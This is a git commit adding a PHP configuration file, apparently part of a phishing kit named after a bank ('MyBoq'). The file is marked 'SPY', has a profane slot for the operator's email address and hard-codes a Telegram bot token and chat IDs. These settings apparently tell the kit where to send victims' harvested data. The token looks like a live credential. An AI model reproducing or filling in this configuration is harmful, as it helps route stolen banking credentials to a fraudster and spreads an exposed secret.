f798957dae6a27ee150b89f8b05c3e270a8f496e
carmeloaites286 <carmeloaites286@gmail.com>
2026-06-26 16:33:24 +1000

    Add files via upload

---
+++ MyBoq/config/email.php
@@ -0,0 +1,9 @@
+<?php
+ // SPY
+ $to = "email"; // put ur fucking mail here
+
+  
+ $tgbot= $api = $apikey ="8563470132:AAH5qMSbltcc81sAbjGVAXOw8CoTUsqzaPY"; // put ur telegram bot 
+
+ $chatid =$chatid1 ="722615124";
+?>
